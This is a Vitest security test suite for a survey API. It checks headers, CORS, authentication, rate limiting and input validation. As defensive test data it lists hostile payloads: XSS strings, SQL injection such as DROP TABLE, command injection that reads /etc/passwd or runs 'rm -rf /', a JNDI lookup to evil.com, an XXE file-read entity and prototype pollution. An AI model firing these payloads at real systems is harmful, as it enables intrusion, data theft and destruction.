import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { createEnhancedApiTestSuite, apiAssertions } from '../../utils/enhanced-api-test-utils';
import { ApiTestConfig, REQUIRED_SECURITY_HEADERS } from '../../config/api-test-config';
import comprehensiveFixtures from '../../fixtures/comprehensive-api-fixtures.json';

describe('Security Test Suite', () => {
  let apiTestSuite: any;
  
  beforeEach(async () => {
    const config: Partial<ApiTestConfig> = {
      security: {
        enabled: true,
        checkHeaders: true,
        checkCors: true,
        checkRateLimit: true
      },
      performance: {
        enabled: false,
        maxResponseTime: 10000,
        loadTestConcurrency: 1,
        loadTestRequests: 1
      }
    };

    apiTestSuite = createEnhancedApiTestSuite(config);
    apiTestSuite.beforeEach();
  });

  afterEach(() => {
    apiTestSuite.afterEach();
  });

  describe('Security Headers Tests', () => {
    it('should include all required security headers', async () => {
      const endpoints = [
        '/survey/test-minimal',
        '/survey/test-minimal/stakeholders',
        '/survey/test-minimal/step/q1?stakeholderId=ceo'
      ];
      
      for (const endpoint of endpoints) {
        const { response } = await apiTestSuite.get(endpoint);
        
        expect(response.status).toBe(200);
        
        REQUIRED_SECURITY_HEADERS.forEach(header => {
          const value = response.headers.get(header);
          expect(value, `Missing security header: ${header} on ${endpoint}`).toBeTruthy();
        });
        
        // Verify specific security header values
        expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
        expect(response.headers.get('X-Frame-Options')).toBe('DENY');
        expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
        expect(response.headers.get('Referrer-Policy')).toBe('no-referrer');
        expect(response.headers.get('Cache-Control')).toContain('no-store');
        expect(response.headers.get('Cache-Control')).toContain('no-cache');
        expect(response.headers.get('Cache-Control')).toContain('must-revalidate');
      }
    });

    it('should not expose server information', async () => {
      const { response } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      // Should not expose server technology
      expect(response.headers.get('Server')).not.toBeTruthy();
      expect(response.headers.get('X-Powered-By')).not.toBeTruthy();
      expect(response.headers.get('X-AspNet-Version')).not.toBeTruthy();
      expect(response.headers.get('X-AspNetMvc-Version')).not.toBeTruthy();
    });

    it('should set appropriate CORS headers', async () => {
      const { response } = await apiTestSuite.get('/survey/test-minimal/stakeholders');
      
      expect(response.status).toBe(200);
      
      // CORS headers should be present
      expect(response.headers.get('Access-Control-Allow-Origin')).toBeTruthy();
      expect(response.headers.get('Access-Control-Allow-Methods')).toBeTruthy();
      expect(response.headers.get('Access-Control-Allow-Headers')).toBeTruthy();
      
      // Should not allow all origins in production
      const origin = response.headers.get('Access-Control-Allow-Origin');
      expect(origin).not.toBe('*'); // Should be specific origin, not wildcard
    });

    it('should handle OPTIONS requests for CORS preflight', async () => {
      const { response } = await apiTestSuite.makeRequest('/survey/test-minimal/stakeholders', {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://example.com',
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Content-Type'
        }
      }, 200);
      
      expect(response.status).toBe(200);
      expect(response.headers.get('Access-Control-Allow-Origin')).toBeTruthy();
      expect(response.headers.get('Access-Control-Allow-Methods')).toBeTruthy();
      expect(response.headers.get('Access-Control-Allow-Headers')).toBeTruthy();
    });
  });

  describe('Input Validation Security Tests', () => {
    it('should prevent XSS attacks in survey ID parameter', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '"><script>alert("xss")</script>',
        'javascript:/*-/*`/*\\`/*\'/*"/**/(/**/onerror=alert("xss"))//',
        '<svg onload=alert("xss")>',
        '<iframe src="javascript:alert(\'xss\')"></iframe>'
      ];
      
      for (const payload of xssPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const { response, data } = await apiTestSuite.get(`/survey/${encodedPayload}`, 400);
        
        expect(response.status).toBe(400);
        apiAssertions.isValidApiError(data);
        expect(data.code).toBe('INVALID_SURVEY_ID');
        
        // Response should not contain the raw payload
        expect(JSON.stringify(data)).not.toContain(payload);
      }
    });

    it('should prevent SQL injection in parameters', async () => {
      const sqlPayloads = [
        "'; DROP TABLE surveys; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin' /*",
        "' OR 1=1#",
        "' OR 1=1/*"
      ];
      
      for (const payload of sqlPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const { response, data } = await apiTestSuite.get(`/survey/${encodedPayload}`, 400);
        
        expect(response.status).toBe(400);
        apiAssertions.isValidApiError(data);
        expect(data.code).toBe('INVALID_SURVEY_ID');
      }
    });

    it('should prevent command injection in parameters', async () => {
      const cmdPayloads = [
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; ls -la',
        '& net user',
        '| dir'
      ];
      
      for (const payload of cmdPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const { response, data } = await apiTestSuite.get(`/survey/${encodedPayload}`, 400);
        
        expect(response.status).toBe(400);
        apiAssertions.isValidApiError(data);
        expect(data.code).toBe('INVALID_SURVEY_ID');
      }
    });

    it('should sanitize malicious input in POST requests', async () => {
      const maliciousInputs = [
        {
          responses: {
            q1: '<script>alert("xss")</script>',
            q2: 'javascript:alert("xss")'
          },
          stepId: 'q1',
          stakeholderId: 'ceo',
          organizationId: 'test-org'
        },
        {
          responses: {
            q1: '\'; DROP TABLE responses; --',
            q2: 'good'
          },
          stepId: 'q1',
          stakeholderId: 'ceo',
          organizationId: 'test-org'
        },
        {
          responses: {
            q1: '${jndi:ldap://evil.com/a}',
            q2: 'good'
          },
          stepId: 'q1',
          stakeholderId: 'ceo',
          organizationId: 'test-org'
        }
      ];
      
      for (const maliciousInput of maliciousInputs) {
        const { response, data } = await apiTestSuite.post('/survey/test-minimal/step/q1', maliciousInput, 400);
        
        expect(response.status).toBe(400);
        expect(data.success).toBe(false);
        
        // Response should not contain the raw malicious input
        const responseText = JSON.stringify(data);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('DROP TABLE');
        expect(responseText).not.toContain('jndi:ldap');
      }
    });

    it('should validate content length to prevent DoS attacks', async () => {
      const oversizedPayload = {
        responses: {
          q1: 'A'.repeat(10000000), // 10MB string
          q2: 'good'
        },
        stepId: 'q1',
        stakeholderId: 'ceo',
        organizationId: 'test-org'
      };
      
      const { response, data } = await apiTestSuite.post('/survey/test-minimal/step/q1', oversizedPayload, 400);
      
      expect(response.status).toBe(400);
      expect(data.success).toBe(false);
      expect(data.errors).toBeDefined();
    });
  });

  describe('Authentication and Authorization Tests', () => {
    it('should require authentication for admin endpoints', async () => {
      const adminEndpoints = [
        '/admin/surveys',
        '/admin/surveys/test-minimal',
        '/admin/surveys/test-minimal/responses',
        '/admin/surveys/test-minimal/results'
      ];
      
      for (const endpoint of adminEndpoints) {
        const { response, data } = await apiTestSuite.makeRequest(endpoint, {
          headers: {} // No authorization header
        }, 401);
        
        expect(response.status).toBe(401);
        apiAssertions.isValidApiError(data);
        expect(data.code).toBe('UNAUTHORIZED');
      }
    });

    it('should validate JWT tokens properly', async () => {
      const invalidTokens = [
        'invalid.jwt.token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        'Bearer invalid-token',
        'Bearer',
        '',
        'malformed-token-without-bearer'
      ];
      
      for (const token of invalidTokens) {
        const { response, data } = await apiTestSuite.makeRequest('/admin/surveys', {
          headers: {
            'Authorization': token
          }
        }, 401);
        
        expect(response.status).toBe(401);
        apiAssertions.isValidApiError(data);
        expect(['UNAUTHORIZED', 'INVALID_TOKEN']).toContain(data.code);
      }
    });

    it('should enforce role-based access control', async () => {
      const userToken = 'Bearer user-token-without-admin-privileges';
      
      const { response, data } = await apiTestSuite.makeRequest('/admin/surveys', {
        headers: {
          'Authorization': userToken
        }
      }, 403);
      
      expect(response.status).toBe(403);
      apiAssertions.isValidApiError(data);
      expect(data.code).toBe('INSUFFICIENT_PERMISSIONS');
    });

    it('should handle expired tokens', async () => {
      const expiredToken = 'Bearer expired-jwt-token';
      
      const { response, data } = await apiTestSuite.makeRequest('/admin/surveys', {
        headers: {
          'Authorization': expiredToken
        }
      }, 401);
      
      expect(response.status).toBe(401);
      apiAssertions.isValidApiError(data);
      expect(data.code).toBe('TOKEN_EXPIRED');
    });
  });

  describe('Rate Limiting Tests', () => {
    it('should implement rate limiting for API endpoints', async () => {
      const requests = [];
      
      // Send 100 requests in quick succession
      for (let i = 0; i < 100; i++) {
        requests.push(
          apiTestSuite.get('/survey/test-minimal').catch(error => ({
            error: true,
            status: error.response?.status || 0
          }))
        );
      }
      
      const results = await Promise.all(requests);
      
      // Should have some rate limiting
      const rateLimitedRequests = results.filter(result => 
        result.response?.status === 429 || result.status === 429
      );
      
      expect(rateLimitedRequests.length).toBeGreaterThan(0);
    });

    it('should include rate limit headers', async () => {
      const { response } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      // Should include rate limit information
      expect(response.headers.get('X-RateLimit-Limit')).toBeTruthy();
      expect(response.headers.get('X-RateLimit-Remaining')).toBeTruthy();
      expect(response.headers.get('X-RateLimit-Reset')).toBeTruthy();
    });

    it('should have different rate limits for different endpoints', async () => {
      // Admin endpoints should have stricter rate limits
      const adminRequests = [];
      for (let i = 0; i < 50; i++) {
        adminRequests.push(
          apiTestSuite.makeRequest('/admin/surveys', {
            headers: { 'Authorization': 'Bearer valid-admin-token' }
          }).catch(error => ({
            error: true,
            status: error.response?.status || 0
          }))
        );
      }
      
      const adminResults = await Promise.all(adminRequests);
      const adminRateLimited = adminResults.filter(result => 
        result.response?.status === 429 || result.status === 429
      );
      
      // Admin endpoints should hit rate limits sooner
      expect(adminRateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('Data Exposure Tests', () => {
    it('should not expose sensitive data in error messages', async () => {
      const { response, data } = await apiTestSuite.get('/survey/non-existent-survey', 404);
      
      expect(response.status).toBe(404);
      
      // Error message should not contain sensitive information
      const errorText = JSON.stringify(data);
      expect(errorText).not.toContain('password');
      expect(errorText).not.toContain('secret');
      expect(errorText).not.toContain('token');
      expect(errorText).not.toContain('database');
      expect(errorText).not.toContain('internal');
      expect(errorText).not.toContain('stack trace');
    });

    it('should not expose internal paths in error messages', async () => {
      const { response, data } = await apiTestSuite.get('/survey/test-minimal/step/invalid-step', 404);
      
      expect(response.status).toBe(404);
      
      const errorText = JSON.stringify(data);
      expect(errorText).not.toContain('/home');
      expect(errorText).not.toContain('/usr');
      expect(errorText).not.toContain('/var');
      expect(errorText).not.toContain('/tmp');
      expect(errorText).not.toContain('node_modules');
    });

    it('should sanitize response data to prevent information disclosure', async () => {
      const { response, data } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      // Should not contain internal system information
      const responseText = JSON.stringify(data);
      expect(responseText).not.toContain('__dirname');
      expect(responseText).not.toContain('process.env');
      expect(responseText).not.toContain('require(');
      expect(responseText).not.toContain('eval(');
    });
  });

  describe('Content Security Policy Tests', () => {
    it('should set appropriate CSP headers for API responses', async () => {
      const { response } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      // While API responses don't typically need CSP, check if it's set
      const csp = response.headers.get('Content-Security-Policy');
      if (csp) {
        // If CSP is set, it should be restrictive
        expect(csp).toContain("default-src 'none'");
        expect(csp).not.toContain("'unsafe-eval'");
        expect(csp).not.toContain("'unsafe-inline'");
      }
    });
  });

  describe('HTTP Method Security Tests', () => {
    it('should only allow appropriate HTTP methods', async () => {
      const disallowedMethods = ['TRACE', 'CONNECT', 'DELETE', 'PUT', 'PATCH'];
      
      for (const method of disallowedMethods) {
        const { response, data } = await apiTestSuite.makeRequest('/survey/test-minimal', {
          method
        }, 405);
        
        expect(response.status).toBe(405);
        apiAssertions.isValidApiError(data);
        expect(data.code).toBe('METHOD_NOT_ALLOWED');
      }
    });

    it('should handle HEAD requests appropriately', async () => {
      const { response } = await apiTestSuite.makeRequest('/survey/test-minimal', {
        method: 'HEAD'
      }, 200);
      
      expect(response.status).toBe(200);
      // HEAD should return same headers as GET but no body
      expect(response.headers.get('content-type')).toBeTruthy();
      expect(response.headers.get('content-length')).toBeTruthy();
    });
  });

  describe('Protocol Security Tests', () => {
    it('should enforce HTTPS in production environment', async () => {
      // This test depends on environment configuration
      const { response } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      // Check for HTTPS enforcement headers
      const strictTransportSecurity = response.headers.get('Strict-Transport-Security');
      if (strictTransportSecurity) {
        expect(strictTransportSecurity).toContain('max-age=');
        expect(strictTransportSecurity).toContain('includeSubDomains');
      }
    });
  });

  describe('File Upload Security Tests', () => {
    it('should validate file types if file uploads are supported', async () => {
      // This is a placeholder test - implement if file uploads are added
      const maliciousFiles = [
        { name: 'malicious.exe', type: 'application/octet-stream' },
        { name: 'script.js', type: 'application/javascript' },
        { name: 'payload.php', type: 'application/x-php' },
        { name: 'virus.bat', type: 'application/x-bat' }
      ];
      
      // Test would go here if file upload endpoints exist
      expect(true).toBe(true); // Placeholder
    });
  });

  describe('Session Security Tests', () => {
    it('should set secure session cookies', async () => {
      const { response } = await apiTestSuite.get('/survey/test-minimal');
      
      expect(response.status).toBe(200);
      
      const setCookieHeaders = response.headers.getSetCookie?.() || [];
      
      setCookieHeaders.forEach(cookie => {
        if (cookie.toLowerCase().includes('session')) {
          expect(cookie).toContain('Secure');
          expect(cookie).toContain('HttpOnly');
          expect(cookie).toContain('SameSite=Strict');
        }
      });
    });
  });

  describe('XML/JSON Parsing Security Tests', () => {
    it('should prevent XML External Entity (XXE) attacks', async () => {
      const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>`;
      
      const { response, data } = await apiTestSuite.makeRequest('/survey/test-minimal/step/q1', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/xml'
        },
        body: xxePayload
      }, 400);
      
      expect(response.status).toBe(400);
      
      // Should not contain file system content
      const responseText = JSON.stringify(data);
      expect(responseText).not.toContain('root:');
      expect(responseText).not.toContain('/bin/');
    });

    it('should prevent JSON parsing attacks', async () => {
      const maliciousJson = {
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
        responses: { q1: 'test' },
        stepId: 'q1',
        stakeholderId: 'ceo',
        organizationId: 'test-org'
      };
      
      const { response, data } = await apiTestSuite.post('/survey/test-minimal/step/q1', maliciousJson, 400);
      
      expect(response.status).toBe(400);
      
      // Should not have prototype pollution
      expect(({}).isAdmin).toBeUndefined();
    });
  });

  describe('Security Regression Tests', () => {
    it('should maintain security posture across all endpoints', async () => {
      const endpoints = [
        '/survey/test-minimal',
        '/survey/test-minimal/stakeholders',
        '/survey/test-minimal/step/q1?stakeholderId=ceo',
        '/survey/test-comprehensive',
        '/survey/test-comprehensive/stakeholders'
      ];
      
      for (const endpoint of endpoints) {
        const { response } = await apiTestSuite.get(endpoint);
        
        expect(response.status).toBe(200);
        
        // All endpoints should have consistent security headers
        expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
        expect(response.headers.get('X-Frame-Options')).toBe('DENY');
        expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
        expect(response.headers.get('Referrer-Policy')).toBe('no-referrer');
        
        // Should not expose sensitive headers
        expect(response.headers.get('Server')).not.toBeTruthy();
        expect(response.headers.get('X-Powered-By')).not.toBeTruthy();
      }
    });
  });
});